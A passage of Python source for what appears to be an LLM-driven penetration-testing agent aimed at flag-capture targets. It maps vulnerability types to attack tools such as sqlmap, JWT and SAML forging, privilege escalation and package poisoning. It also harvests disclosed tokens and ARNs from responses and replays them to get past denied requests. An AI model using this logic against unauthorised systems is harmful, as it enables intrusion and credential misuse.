"""ExecutionCoordinator — task execution policies and Runtime adapters.

Owns per-task execution policies, defense probing, privilege escalation, the systematic exploit pass, and the Runtime planner/executor/evaluator adapters. State and cross-coordinator calls are forwarded to the shared Orchestrator context.
"""
from __future__ import annotations

import asyncio
import hashlib
import json
import logging
import os
import re
import shutil
import time
from dataclasses import dataclass, field, replace
from typing import Any, Dict, List, Optional

log = logging.getLogger(__name__)

from darwin.cteg import CTEG, TaskRecord, build_scenario_profile
from darwin.core.context import ContextManager
from darwin.core.contracts import (
    Budget,
    Objective,
    ReplanRecommendation,
    TaskOutcome,
    TaskStatus,
)
from darwin.core.evaluator import (
    Evaluation,
    Evaluator as CoreEvaluator,
    FailureType,
)
from darwin.core.executor import ToolExecutor, ExecutionResult as CoreExecutionResult
from darwin.core.memory import MemoryManager
from darwin.core.metrics import MetricsCalculator
from darwin.core.replan import Replanner
from darwin.core.runtime import Runtime
from darwin.core.scheduler import ParityScheduler
from darwin.core.schemas import (
    parse_analyze_output,
    parse_plan_tasks,
    parse_research_findings,
    parse_service_research_findings,
)
from darwin.core.task import Task, deps_from_task_ids
from darwin.core.task_graph import TaskGraph, dependency_task_ids
from darwin.utils.urls import (
    IDENTIFIER_RE as _IDENTIFIER_RE,
    ROUTE_VARIANT_MAX_IDENTIFIERS as _ROUTE_VARIANT_MAX_IDENTIFIERS,
    observed_identifiers,
    route_variants,
)
from darwin.core.belief import (
    node_ids_by_type,
    render_belief_snapshot,
    render_critical_facts,
    render_new_discoveries,
)
from darwin.data_model import (
    normalize_dkg_state, PipelineState, EndpointInfo,
    OrchestratorPhase, TaskResult, VulnerabilityHypothesis, ExploitationPlan,
)
from darwin.dkg import DKG
from darwin.dpm import DefensePerceptionModule, DefenseStateVector
from darwin.dave import DAVE, ExploitAttempt, parse_tool_stdout
from darwin.tools.mcp_client import MCPClientPool, load_mcp_config
from darwin.tools.mcp_gateway import ToolResult
from darwin.tools.recon_server import create_recon_gateway, parse_response
from darwin.tools.attack_server import create_attack_gateway
from darwin.tools.availability import is_available as _spec_is_available
from darwin.utils.http_client import HTTPClient, ProbeClient, HTTPResponse
from darwin.utils.llm import LLMSession
from darwin.utils.phase_logger import PhaseLogger
from darwin.utils.thought_logger import ThoughtLogger


# -- System Prompts (imported from darwin.prompts) --------------------------
from darwin.prompts.orchestrator import (
    SYSTEM_PROMPT_ORCHESTRATOR_UNIFIED,
    SYSTEM_PROMPT_ANALYZE,
    SYSTEM_PROMPT_LOGIN,
    SYSTEM_PROMPT_BYPASS,
)
from darwin.prompts.planner import SYSTEM_PROMPT_PLANNER
from darwin.prompts.evaluator import SYSTEM_PROMPT_EVALUATOR
from darwin.prompts.research import SYSTEM_PROMPT_RESEARCH


from darwin.orchestration.context import CoordinatorContext

@dataclass
class TaskExecution:
    """Outcome of one plan-task execution incl. post-processing (P15 2b)."""

    success: bool
    result_text: str
    flag_result: "TaskResult | None" = None
    skip: bool = False
    stderr: str = ""
    exit_code: int = 0
    elapsed_ms: float = 0.0
    normalized: dict = field(default_factory=dict)


class _RuntimeFlagFound(Exception):
    """Terminal signal: the Runtime-driven path captured a verified flag."""


# ── Success-condition helpers ───────────────────────────────────────
# Writes are judged by the persisted effect, not by a 2xx on the write call.
_WRITE_METHODS = frozenset({"POST", "PUT", "PATCH", "DELETE"})
_WRITE_TOOLS = frozenset({"http_post", "file_upload", "tomcat_exploit", "php_filter_chain"})
_METHOD_DEFAULT = {"http_post": "POST", "curl_get": "GET", "http_method_probe": "OPTIONS"}
_HTTP_STATUS_RE = re.compile(r"HTTP/\d(?:\.\d)?\s+(\d{3})|\bHTTP\s+(\d{3})")

# Identity propagation: when a resource read is denied and the target itself
# disclosed an identity/token value, retry the denied request presenting that
# value verbatim. Header names are generic conventions, the values are always
# observed (never guessed).
_IDENTITY_HEADERS = ("X-Caller-ARN", "X-Amz-Caller-Arn", "Authorization",
                     "X-User", "X-Username", "X-User-Id")
_IDENTITY_ARN_RE = re.compile(r"arn:[a-z0-9-]+:[^\s\"'\\,\]})]+", re.IGNORECASE)
_IDENTITY_KV_RE = re.compile(
    r'"(?:caller_arn|callerArn|user_arn|identity|access_token|session_token'
    r'|api_key|token)"\s*:\s*"([^"]{3,160})"',
    re.IGNORECASE,
)
_DENIED_MARKERS = ("accessdenied", "access denied", "unauthorized", "forbidden")
_IDENTITY_PROBE_MAX = 10  # hard cap on extra requests per task


def _call_method(name: str, args: dict | None) -> str:
    """HTTP verb used by a planned/executed call ('' when not method-based)."""
    args = args if isinstance(args, dict) else {}
    method = str(args.get("method", "") or "").upper()
    return method or _METHOD_DEFAULT.get(name, "")


def _planned_write_intent(tool: str, params: dict | None) -> bool:
    """True when the planned call is expected to mutate target-side state."""
    if tool in _WRITE_TOOLS:
        return True
    return _call_method(tool, params) in _WRITE_METHODS


def _http_status_of(text: str) -> int | None:
    """Extract the HTTP status code from curl/urllib style tool output."""
    match = _HTTP_STATUS_RE.search(str(text or ""))
    if not match:
        return None
    return int(match.group(1) or match.group(2))


# ── Route-variant retry ─────────────────────────────────────────────
# A wrong path SHAPE (collection route vs detail route) answers 404/405 even
# when the verb is right; the neighbour paths come from identifiers the task
# already observed (see darwin.utils.urls).
_ROUTE_VARIANT_STATUSES = (404, 405)

# Tools the systematic pass falls back to for an unmapped vulnerability. The
# first entry must be able to express a write verb, otherwise a write-class
# hypothesis that arrives unlabelled can only ever be tested with a read.
_FALLBACK_HTTP_TOOLS = [
    "http_method_probe", "http_post", "send_payload", "curl_get",
]

# Vulnerability type -> systematic-pass tool mapping (with fuzzy matching).
# A type whose exploit IS a write (publish/register/overwrite) must map to a
# tool that can express PUT/POST/PATCH/DELETE — a read-only fallback can
# never satisfy it.
_VULN_TOOL_MAP: dict[str, list[str]] = {
    "sqli": ["sqlmap_test"],
    "sql": ["sqlmap_test"],
    "xss": ["xss_reflection_test"],
    "cmdi": ["command_injection_test"],
    "command injection": ["command_injection_test"],
    "ssti": ["send_payload"],
    "lfi": ["curl_get"],
    "file upload": ["send_payload"],
    "idor": ["curl_get"],
    "idor-url-path": ["curl_get"],
    "auth": ["curl_get"],
    "csrf": ["curl_get"],
    "deserialization": ["send_payload", "shell_exec"],
    "ssrf": ["ssrf_probe"],
    "xxe": ["send_payload"],
    "jwt": ["jwt_forge"],
    "race condition": ["send_payload", "shell_exec"],
    "informationdisclosure": ["curl_get"],  # metadata/API endpoints should use curl_get, not send_payload
    "unauthenticatedaccess": ["curl_get", "aws_cli"],  # open S3 buckets, unauthenticated APIs
    "privilege_escalation": ["shell_exec", "linux_priv_check"],
    "container_escape": ["check_capabilities", "check_mounts", "shell_exec"],
    "mysql_file_write": ["mysql_file_write"],
    "mysql_udf": ["mysql_query", "mysql_file_write", "shell_exec"],
    "postgres_rce": ["psql_query", "shell_exec"],
    "authbypass": ["curl_get", "test_credential", "ssh_exec", "shell_exec",
                   "redis_cmd", "mysql_query", "psql_query", "mssql_query",
                   "mssqlclient_query", "oracle_query"],
    # NOTE: aws_cli removed from authbypass — it requires service+action
    # params that the systematic pass cannot populate from vuln context
    "weakauth": ["mssqlclient_query", "mssql_query", "mysql_query",
                 "psql_query", "redis_cmd", "oracle_query",
                 "test_credential", "ssh_exec"],
    "platformdiscovery": ["aws_cli", "curl_get", "aws_sts_query"],
    # Cloud-native vuln types — systematic pass needs these to
    # auto-select tools for IAM, federation, SCP, and OIDC/SAML
    # scenarios that the generic "platformdiscovery" fallback
    # cannot cover.
    "cloud_iam": ["aws_sts_query", "aws_cli"],
    "cloud_federation": ["saml_forge", "aws_cli"],
    "cloud_token_exchange": ["aws_sts_query", "aws_cli"],
    "cloud_scp_bypass": ["aws_sts_query", "aws_cli"],
    "cloud_oidc": ["jwt_forge", "aws_iam_federation"],
    "cloud_passrole": ["aws_cli", "send_payload"],
    # Write-class families: the exploit itself is a publish/register/
    # overwrite, so the mapped tool must be able to express
    # PUT/POST/PATCH/DELETE (a read-only fallback can never succeed).
    "dependency_confusion": ["http_method_probe"],
    "dependency confusion": ["http_method_probe"],
    "supply_chain": ["http_method_probe"],
    "supply chain": ["http_method_probe"],
    "package_poisoning": ["http_method_probe"],
    "registry_poisoning": ["http_method_probe"],
    "artifact_poisoning": ["http_method_probe"],
}

_VULN_FUZZY_MAP: dict[str, list[str]] = {
    "sqli": ["sqlmap_test"],
    "xss": ["xss_reflection_test"],
    "cmdi": ["command_injection_test"],
    "idor": ["curl_get"],
    "auth": ["curl_get"],
    "deserialization": ["send_payload"],
    "ssrf": ["ssrf_probe"],
    "xxe": ["send_payload"],
    "jwt": ["jwt_forge"],
    "privilege": ["shell_exec", "linux_priv_check"],
    "escape": ["check_capabilities", "check_mounts", "shell_exec"],
    # Write-class fuzzy matches, ordered BEFORE the cloud "registry"
    # entry so "PackageRegistryPoisoning" maps to a write-capable
    # HTTP tool instead of the container registry helper.
    "dependency": ["http_method_probe"],
    "supply": ["http_method_probe"],
    "poison": ["http_method_probe"],
    "squat": ["http_method_probe"],
    "publish": ["http_method_probe"],
    "package": ["http_method_probe"],
    # Cloud-native fuzzy matches — catch LLM-generated vuln types
    # like "CloudFederation", "SCP Bypass Attack", "OIDC Token Abuse"
    "federation": ["saml_forge", "aws_cli"],
    "oidc": ["jwt_forge", "aws_cli"],
    "saml": ["saml_forge", "aws_cli"],
    "scp": ["aws_sts_query", "aws_cli"],
    "passrole": ["aws_cli", "send_payload"],
    "token_exchange": ["aws_sts_query", "aws_cli"],
    "iam": ["aws_sts_query", "aws_cli"],
    "registry": ["docker_registry", "kubectl_get_pods", "shell_exec"],
    "docker_registry": ["docker_registry", "kubectl_get_pods", "shell_exec"],
}


def _systematic_vuln_tool_map() -> dict[str, list[str]]:
    """Copy of the vuln-type → tool map used by the systematic pass."""
    return {key: list(value) for key, value in _VULN_TOOL_MAP.items()}


def _last_http_status(executed: list[dict] | None) -> int | None:
    """HTTP status of the most recent executed call that reported one."""
    for call in reversed(executed or []):
        status = _http_status_of(str(call.get("stdout", "") or ""))
        if status is not None:
            return status
    return None


def _args_fingerprint(args: dict) -> str:
    """Stable short digest of a tool call's arguments (for dedup keys)."""
    try:
        blob = json.dumps(args, sort_keys=True, default=str)
    except Exception:
        blob = str(args)
    return hashlib.sha1(blob.encode()).hexdigest()[:12]


def _json_body(stdout: str) -> Any:
    """Extract a JSON object/array from a curl_get style tool output."""
    body = str(stdout or "")
    if not body.strip():
        return None
    try:
        parsed = parse_tool_stdout(body)
        if parsed.get("body"):
            body = parsed["body"]
    except Exception as exc:
        log.debug("swallowed exception: %s", exc, exc_info=True)
    stripped = body.strip()
    start = min(
        (i for i in (stripped.find("{"), stripped.find("[")) if i >= 0),
        default=-1,
    )
    if start < 0:
        return None
    try:
        return json.loads(stripped[start:])
    except (json.JSONDecodeError, ValueError):
        return None


def _derive_filter_candidates(
    payload: Any, known_paths: list[str] | None = None,
    max_params: int = 4, max_values: int = 4,
) -> list[tuple[str, str]]:
    """Derive ``(query_param, value)`` candidates from a JSON response.

    A JSON endpoint that returns records usually accepts filters named after
    those records' own fields, so the parameter names are read off the
    response instead of guessed.  Values are drawn from what the response
    shows, from the endpoints already discovered on the target, and finally
    from a token that cannot match anything (an empty filtered view is a
    legitimate, and sometimes privileged, response).
    """
    if not isinstance(payload, dict):
        return []
    records: list[dict] = []
    for value in payload.values():
        if isinstance(value, list):
            records.extend(r for r in value[:3] if isinstance(r, dict))
    if not records:
        return []

    params: list[str] = []
    for record in records:
        for key in record:
            if isinstance(key, str) and key and key not in params:
                params.append(key)

    known = [str(p) for p in (known_paths or []) if p]
    candidates: list[tuple[str, str]] = []
    for param in params[:max_params]:
        observed = [
            str(r.get(param)) for r in records
            if r.get(param) not in (None, "")
        ]
        # Prefer values the response has NOT already shown: a different slice
        # of the collection is where new information lives.
        for value in known[:max_values]:
            if value not in observed:
                candidates.append((param, value))
        for value in dict.fromkeys(observed):
            candidates.append((param, value))
        candidates.append((param, "darwin-probe-nonexistent"))
    return candidates


class _RuntimePlannerAdapter:
    """Runtime Planner adapter (P15 2b): legacy plan generation/review
    behind the Planner Protocol."""

    def __init__(self, orch, target_url: str, cteg_hints: dict | None):
        self.orch = orch
        self.target_url = target_url
        self.cteg_hints = cteg_hints

    async def plan(self, state, objective, memory):
        orch = self.orch
        if not orch.exploitation_plan or not orch.exploitation_plan.tasks:
            orch.exploitation_plan = await orch._generate_exploitation_plan(
                self.target_url, self.cteg_hints
            )
        return TaskGraph(list(orch.exploitation_plan.tasks))

    async def replan(self, state, graph, evaluation, memory):
        orch = self.orch
        task = graph.get(evaluation.task_id) if evaluation.task_id else None
        if task is not None:
            success = evaluation.outcome is TaskOutcome.SUCCESS
            await orch._review_and_update_plan(
                task, success, task.result_summary or ""
            )
        else:
            # Runtime stall (no ready task) → legacy plan-exhausted review.
            if not getattr(orch, "_plan_review_exhausted", False):
                orch._plan_review_exhausted = True
                summary = orch._build_plan_exhaustion_context()
                await orch._review_and_update_plan(
                    Task(
                        id="plan-exhausted",
                        type="review",
                        goal="Plan exhausted",
                        instruction="Plan exhausted",
                        action={"tool": "", "target": "", "params": {}},
                        status=TaskStatus.SUCCESS,
                        attempt_count=1,
                        result_summary=summary,
                    ),
                    True, summary, force=True,
                )
        # The review mutates exploitation_plan — re-sync the graph.
        return TaskGraph(list(orch.exploitation_plan.tasks))


class _RuntimeExecutorAdapter:
    """Runtime Executor adapter (P15 2b): the orchestrator's full per-task
    execution incl. post-processing (defense probe, format retry,
    credential extraction, flag verification)."""

    def __init__(self, orch, tool_defs):
        self.orch = orch
        self.tool_defs = tool_defs

    async def execute(self, task: Task) -> CoreExecutionResult:
        orch = self.orch
        execution = await orch._execute_task_with_policies(
            task, self.tool_defs
        )
        if execution.skip:
            orch._runtime_skip_task = True
            return CoreExecutionResult(
                task_id=task.id,
                tool="",
                planned_tool="",
                adherence=False,
                success=False,
                stdout="",
                stderr="skipped: no tool calls",
                exit_code=1,
                elapsed_ms=0.0,
            )
        orch._runtime_skip_task = False
        _tool = str((task.action or {}).get("tool", "") or "")
        core_res = CoreExecutionResult(
            task_id=task.id,
            tool=_tool,
            planned_tool=_tool,
            adherence=True,
            success=execution.success,
            stdout=execution.result_text[:4000],
            stderr=getattr(execution, "stderr", "") or "",
            exit_code=getattr(execution, "exit_code", 0 if execution.success else 1),
            elapsed_ms=getattr(execution, "elapsed_ms", 0.0),
            normalized=getattr(execution, "normalized", {}) or {},
        )
        if execution.flag_result is not None:
            # The Runtime loop terminates on a verified flag before its
            # own memory step, so record the plan rationale and aggregate
            # execution result here.
            orch.memory.record_task(task)
            # Runtime will not reach its normal memory step on the terminal
            # flag exception; persist exactly one aggregate execution record.
            orch.memory.record_execution(core_res)
            orch._runtime_flag_result = execution.flag_result
            # Mirror the legacy loop, which returns immediately on a
            # verified flag instead of continuing to plan review.
            raise _RuntimeFlagFound()
        task.result_summary = execution.result_text
        return core_res


class _RuntimeEvaluatorAdapter:
    """Runtime Evaluator adapter (P15 2b): rule-based classification, then
    forces a GLOBAL replan after every task to mirror the legacy per-task
    LLM plan review."""

    def __init__(self, orch):
        self.orch = orch

    async def evaluate(self, task, result, state):
        orch = self.orch
        if getattr(orch, "_runtime_skip_task", False):
            return Evaluation(
                task_id=task.id,
                outcome=TaskOutcome.FAILED,
                failure_type=FailureType.INCONCLUSIVE,
                replan=ReplanRecommendation.NONE,
            )
        evaluation = await orch.evaluator.evaluate(task, result, state)
        return replace(evaluation, replan=ReplanRecommendation.GLOBAL)


class ExecutionCoordinator(CoordinatorContext):
    def _persist_verified_flag(self, flag: str, location: str, source: str) -> None:
        flag_id = "flag-" + hashlib.sha1(flag.encode()).hexdigest()[:16]
        self.dkg.add_node("Flag", flag_id, {
            "value": flag, "location": location, "verified": True,
            "source": source,
            "provenance": {"source": source, "location": location},
        })

    def _plan_params_complete(
        self, tool: str, params: dict, known_tools: set[str],
    ) -> tuple[bool, list[str]]:
        """Plan-first execution check: can ``tool`` run with ``params`` as-is?

        Reuses the gateway's own normalization so plan spellings (``url`` vs
        ``target_url``, ``host`` vs ``target``) are honoured exactly like the
        dispatch path. Returns ``(ok, missing_required_params)``.
        """
        if not tool or not isinstance(params, dict) or not params:
            return False, []
        if tool not in known_tools:
            return False, []
        gateway = None
        for _gw in (self.attack_gateway, self.recon_gateway):
            try:
                if tool in _gw.get_tool_names():
                    gateway = _gw
                    break
            except Exception as exc:
                log.debug("gateway lookup failed for %s: %s", tool, exc)
        if gateway is None:
            return False, []
        try:
            spec = gateway.get_tool_specs().get(tool)
        except Exception as exc:
            log.debug("tool spec lookup failed for %s: %s", tool, exc)
            spec = None
        normalize = getattr(gateway, "normalize_params", None)
        try:
            normalized = normalize(tool, params) if callable(normalize) else dict(params)
        except Exception as exc:
            log.debug("param normalization failed for %s: %s", tool, exc)
            normalized = dict(params)
        if not normalized:
            return False, []
        if spec is None:
            # No contract available (e.g. a test double): params provided means
            # the plan is executable as written.
            return True, []
        required = list(getattr(spec, "required", None) or [])
        missing = [name for name in required if name not in normalized]
        return (not missing), missing

    def _tool_declared_params(self, tool: str) -> dict:
        """Declared parameter schema of ``tool`` ({} when unknown)."""
        for _gw in (self.attack_gateway, self.recon_gateway):
            try:
                spec = _gw.get_tool_specs().get(tool)
            except Exception as exc:
                log.debug("tool spec lookup failed for %s: %s", tool, exc)
                continue
            if spec is not None:
                return dict(getattr(spec, "parameters", {}) or {})
        return {}

    def _normalized_tool_args(
        self, tool: str, params: dict,
    ) -> tuple[dict, list[str]]:
        """Gateway-normalized args plus the keys that were dropped.

        Alias source keys (``body``→``data``) are not reported as dropped —
        their value was applied to the canonical parameter.
        """
        raw = dict(params or {})
        alias_keys: set[str] = set()
        normalize = None
        for _gw in (self.attack_gateway, self.recon_gateway):
            try:
                if tool not in _gw.get_tool_names():
                    continue
                normalize = getattr(_gw, "normalize_params", None)
                spec = _gw.get_tool_specs().get(tool)
                if spec is not None:
                    alias_keys = set(getattr(spec, "aliases", {}) or {})
                break
            except Exception as exc:
                log.debug("param normalization lookup failed for %s: %s", tool, exc)
        try:
            normalized = normalize(tool, raw) if callable(normalize) else dict(raw)
        except Exception as exc:
            log.debug("param normalization failed for %s: %s", tool, exc)
            normalized = dict(raw)
        dropped = [k for k in raw if k not in normalized and k not in alias_keys]
        return normalized, dropped

    def _route_identifiers(self, params: dict, extra_text: str = "") -> list[str]:
        """Scalar identifiers this task/target already observed.

        Sources: the task's own params, the sampled responses of the host's
        DKG endpoints, and the failing call's output. Values are filtered to
        identifier-looking tokens so a banner or a sentence never becomes a
        path segment.
        """
        identifiers: list[str] = []

        def _add(values: list[str]) -> None:
            for value in values:
                if value not in identifiers:
                    identifiers.append(value)

        def _collect(value: Any) -> None:
            if isinstance(value, dict):
                for item in value.values():
                    _collect(item)
            elif isinstance(value, (list, tuple)):
                for item in value:
                    _collect(item)
            elif isinstance(value, (str, int, float)) and not isinstance(value, bool):
                token = str(value)
                if _IDENTIFIER_RE.match(token) and token not in identifiers:
                    identifiers.append(token)

        _collect(params or {})
        _host = str(getattr(self, "target_host", "") or "")
        try:
            endpoints = self.dkg.query_nodes("Endpoint")
        except Exception as exc:
            log.debug("endpoint lookup failed for route identifiers: %s", exc)
            endpoints = []
        for endpoint in endpoints:
            url = str(endpoint.get("url", "") or "")
            if _host and _host not in url:
                continue
            _add(observed_identifiers(str(endpoint.get("sample_response", "") or "")))
        _add(observed_identifiers(extra_text))
        return identifiers[:_ROUTE_VARIANT_MAX_IDENTIFIERS]

    def _record_route_probe(self, url: str, method: str, status: int | None) -> None:
        """Persist a derived route probe so the planner can see the real shape."""
        if not url:
            return
        try:
            node_id = f"ep-route-{hashlib.sha1(url.encode()).hexdigest()[:10]}"
            existing = self.dkg.get_node(node_id) or {}
            methods = dict(existing.get("methods", {}) or {})
            if method:
                methods[str(method).upper()] = int(status or 0)
            self.dkg.add_node("Endpoint", node_id, {
                "url": url,
                "method": str(method or "GET").upper(),
                "methods": methods,
                "sample_status": int(status or 0),
                "discovered_by": "route-variant",
            })
        except Exception as exc:
            log.debug("route probe persistence failed for %s: %s", url, exc)

    async def _verify_success_condition(
        self,
        condition: dict,
        executed: list[dict],
        any_success: bool,
        flag_found: bool,
    ) -> tuple[bool, str]:
        """Verify a task's ``success_condition`` against what actually ran.

        Returns ``(met, detail)``.  A task whose tool returned exit code 0 but
        whose observable goal was not achieved must NOT be treated as done —
        that is how a planned PUT got replaced by an unrelated GET and still
        counted as success.
        """
        ctype = str(condition.get("type", "") or "").strip().lower()
        joined = "\n".join(str(c.get("stdout", "") or "") for c in executed)

        if ctype == "tool_success":
            want = str(condition.get("tool", "") or "")
            want_method = str(condition.get("method", "") or "").upper()
            if not want:
                return any_success, "tool_success without a tool name"
            matched = [
                c for c in executed
                if c.get("name") == want
                and (not want_method or c.get("method") == want_method)
            ]
            if not matched:
                ran = ", ".join(sorted({str(c.get("name", "")) for c in executed})) or "nothing"
                exp = f"{want} {want_method}".strip()
                return False, f"expected {exp} to run, but ran: {ran}"
            ok = any(bool(c.get("success")) for c in matched)
            suffix = f" {want_method}" if want_method else ""
            return ok, (f"{want}{suffix} executed" if ok else f"{want}{suffix} executed but failed")

        if ctype in ("body_contains", "body_not_contains"):
            value = str(condition.get("value", "") or "")
            if not value:
                return any_success, f"{ctype} without a value"
            present = value.lower() in joined.lower()
            if ctype == "body_contains":
                return present, (f"output contains {value!r}" if present
                                 else f"output does not contain {value!r}")
            return (not present), (f"output excludes {value!r}" if not present
                                   else f"output unexpectedly contains {value!r}")

        if ctype == "http_status_in":
            wanted = {int(s) for s in (condition.get("status") or []) if str(s).isdigit()}
            if not wanted:
                return any_success, "http_status_in without status codes"
            observed = next(
                (s for s in (_http_status_of(c.get("stdout", "")) for c in executed)
                 if s is not None),
                None,
            )
            if observed is None:
                return False, f"no HTTP status in output (expected one of {sorted(wanted)})"
            return observed in wanted, f"HTTP {observed} (expected one of {sorted(wanted)})"

        if ctype == "flag_captured":
            return bool(flag_found), ("flag captured" if flag_found else "no flag captured")

        if ctype == "probe":
            url = str(condition.get("url", "") or "")
            if not url:
                return any_success, "probe without a url"
            args: dict = {"url": url, "follow_redirects": True}
            if condition.get("headers"):
                args["headers"] = str(condition["headers"])
            if condition.get("cookie"):
                args["cookie"] = str(condition["cookie"])
            try:
                probe = await self._call_tool("curl_get", args)
            except Exception as exc:  # noqa: BLE001 - reported as unmet
                return False, f"probe request failed: {exc}"
            body = str(getattr(probe, "stdout", "") or "")
            if condition.get("contains") and (
                str(condition["contains"]).lower() not in body.lower()
            ):
                return False, f"probe {url} lacks {condition['contains']!r}"
            if condition.get("not_contains") and (
                str(condition["not_contains"]).lower() in body.lower()
            ):
                return False, f"probe {url} contains {condition['not_contains']!r}"
            wanted = {int(s) for s in (condition.get("status_in") or []) if str(s).isdigit()}
            if wanted:
                observed = _http_status_of(body)
                if observed is None or observed not in wanted:
                    return False, f"probe {url} returned HTTP {observed} (expected {sorted(wanted)})"
            return True, f"probe {url} confirmed the effect"

        # Unknown condition type: do not fail a task the planner described
        # with a vocabulary this runtime does not know yet.
        log.warning("Unknown success_condition type %r — falling back to tool success", ctype)
        return any_success, f"unknown condition type {ctype!r}"

    def _observed_identity_values(self, limit: int = 4) -> list[str]:
        """Identity/token values this target already disclosed (never guessed)."""
        blobs: list[str] = []
        for node_type in ("Endpoint", "Analysis", "Session", "Credential", "Service"):
            for node in self.dkg.query_nodes(node_type):
                for key in ("sample_response", "content", "value", "token", "username"):
                    _v = node.get(key)
                    if _v:
                        blobs.append(str(_v))
        text = "\n".join(blobs)
        values: list[str] = []
        for match in _IDENTITY_ARN_RE.finditer(text):
            values.append(match.group(0))
        for match in _IDENTITY_KV_RE.finditer(text):
            values.append(match.group(1))
        out: list[str] = []
        for value in values:
            value = value.strip().strip('"')
            if len(value) >= 3 and value not in out:
                out.append(value)
        return out[:limit]

    async def _probe_identity_propagation(self, executed: list[dict]) -> str | None:
        """Retry denied reads with the identity value the target disclosed.

        Generic pattern: a resource answers 401/403 while another endpoint on
        the same target returns the caller identity (caller_arn / token / user).
        Presenting that value verbatim in the conventional header is the
        documented way such APIs authorise the read. Bounded and deduplicated.
        """
        denied: list[str] = []
        for call in executed:
            out = str(call.get("stdout", "") or "")
            status = _http_status_of(out)
            lowered = out.lower()
            if status in (401, 403) or any(m in lowered for m in _DENIED_MARKERS):
                url = str((call.get("args") or {}).get("url", "") or "")
                if url and url not in denied:
                    denied.append(url)
        if not denied:
            return None
        values = self._observed_identity_values()
        if not values:
            return None
        tried = getattr(self, "_identity_probe_tried", None)
        if tried is None:
            tried = set()
            self._identity_probe_tried = tried
        attempts = 0
        for url in denied[:2]:
            for value in values[:2]:
                for header in _IDENTITY_HEADERS:
                    if attempts >= _IDENTITY_PROBE_MAX:
                        return None
                    key = (url, header, value)
                    if key in tried:
                        continue
                    tried.add(key)
                    attempts += 1
                    presented = (
                        f"Bearer {value}" if header == "Authorization" else value
                    )
                    res = await self._call_tool("curl_get", {
                        "url": url,
                        "headers": f"{header}: {presented}",
                        "follow_redirects": True,
                    })
                    self.step_count += 1
                    text = str(getattr(res, "stdout", "") or "")
                    self._task_log_event(
                        "info", "identity_probe",
                        url=url, header=header, status=_http_status_of(text),
                    )
                    for found in self.flag_pattern.findall(text):
                        ok, reason = await self._verify_flag(
                            found, text, {"url": url}, tool_name="curl_get",
                        )
                        if ok:
                            return found
                        log.debug("identity probe flag rejected: %s", reason)
                    # A non-denial answer means this header was accepted —
                    # no need to keep trying other spellings for this URL.
                    if _http_status_of(text) not in (401, 403):
                        break
        return None

    def _task_anchor_ids(self, task: Task) -> list[str]:
        """Resolve task target to DKG node ids usable as topology anchors."""
        action = task.action or {}
        params = action.get("params", {}) or {}
        if isinstance(params, str):
            try:
                params = json.loads(params)
            except (TypeError, ValueError):
                params = {}
        target = str(
            action.get("target", "")
            or params.get("url", "")
            or params.get("target_url", "")
            or ""
        ).strip()
        if not target:
            return []
        import ipaddress
        from urllib.parse import urlparse

        try:
            host = urlparse(target if "://" in target else f"http://{target}").hostname
        except Exception:
            host = None
        host = (host or "").lower()
        anchors: list[str] = []
        if host:
            host_id = f"host-{host}"
            if self.dkg.get_node(host_id):
                anchors.append(host_id)
        for row in self.dkg.query_nodes():
            node_id = str(row.get("id", ""))
            url = str(row.get("url", "") or "")
            ip = str(row.get("ip", "") or "")
            internal_ip = str(row.get("internal_ip", "") or "")
            if node_id in anchors:
                continue
            matched = False
            for candidate in (ip, internal_ip):
                if not candidate or not host:
                    continue
                try:
                    if ipaddress.ip_address(candidate) == ipaddress.ip_address(host):
                        matched = True
                        break
                except ValueError:
                    if candidate == host:
                        matched = True
                        break
            if not matched and url and host:
                try:
                    node_host = urlparse(url if "://" in url else f"http://{url}").hostname
                    matched = bool(node_host and node_host.lower() == host)
                except Exception:
                    matched = False
            if matched:
                anchors.append(node_id)
        return list(dict.fromkeys(anchors))[:5]

    def _find_vuln_dkg_id(self, v) -> str | None:
        """Locate the DKG Vulnerability node backing a hypothesis (O2.1).

        _analyze_phase writes ids as ``vuln-{1-based index}``, but the
        augment path uses other formulas and duplicates are possible, so the
        node is matched by fields first and falls back to the positional id
        only when that node actually exists.
        """
        try:
            ep_norm = (v.endpoint or "").rstrip("/")
            for n in self.dkg.query_nodes("Vulnerability"):
                if (n.get("vuln_type") or "") != (v.vuln_type or ""):
                    continue
                if (n.get("endpoint") or "").rstrip("/") != ep_norm:
                    continue
                if (n.get("parameter") or "") not in ("", v.param or ""):
                    continue
                return n.get("id")
            try:
                idx = self.vulnerabilities.index(v)
            except ValueError:
                return None
            cand = f"vuln-{idx + 1}"
            if self.dkg.get_node(cand):
                return cand
        except Exception:
            return None
        return None

    def _apply_vulnerability_feedback(
        self,
        task: Task,
        *,
        success: bool,
        failure_type: str | None = None,
        delta: float = 0.0,
        flag_found: bool = False,
    ) -> None:
        """O2.1: apply one task outcome to the matching vulnerability beliefs.

        Matches hypotheses by endpoint (exact ``rstrip('/')`` or mutual
        substring). Updates the in-memory hypothesis confidence/status and
        mirrors it onto the DKG Vulnerability node. Never raises — belief
        feedback must never break the execution path.
        """
        if not self.vulnerabilities:
            return
        _task_action = task.action or {}
        params = _task_action.get("params", {}) or {}
        if isinstance(params, str):
            try:
                params = json.loads(params)
            except (json.JSONDecodeError, TypeError):
                params = {}
        if not isinstance(params, dict):
            params = {}
        endpoint = str(
            _task_action.get("target", "")
            or params.get("url", "")
            or params.get("target_url", "")
            or ""
        ).strip()
        if not endpoint:
            return

        if success:
            delta = 0.2 if flag_found else 0.05
            status = "confirmed" if flag_found else "tested"
        else:
            status_map = {
                "hypothesis_rejected": "rejected",
                "defense_blocked": "blocked",
                "inconclusive": "inconclusive",
            }
            status = status_map.get(failure_type or "", "")

        endpoint_norm = endpoint.rstrip("/")
        matched = False
        for v in self.vulnerabilities:
            v_ep = (v.endpoint or "").rstrip("/")
            if not v_ep:
                continue
            if not (
                endpoint_norm == v_ep
                or (endpoint_norm and endpoint_norm in v_ep)
                or (v_ep and v_ep in endpoint_norm)
            ):
                continue
            matched = True
            new_conf = max(0.05, min(0.98, v.confidence + delta))
            v.confidence = new_conf
            if status:
                v.status = status
            try:
                node_id = self._find_vuln_dkg_id(v)
                if node_id:
                    self.dkg.add_node("Vulnerability", node_id, {
                        "confidence": round(new_conf, 3),
                        "status": status,
                        "last_tested_at": time.strftime("%Y-%m-%dT%H:%M:%S"),
                    })
            except Exception as exc:
                log.debug("swallowed exception: %s", exc, exc_info=True)

    def _apply_attack_path_feedback(self, task: Task, *, success: bool,
                                    failure_type: str | None = None) -> None:
        """Persist bounded confidence/status feedback for a referenced path."""
        action = task.action or {}
        path_id = str(action.get("path_id", "") or "")
        if not path_id:
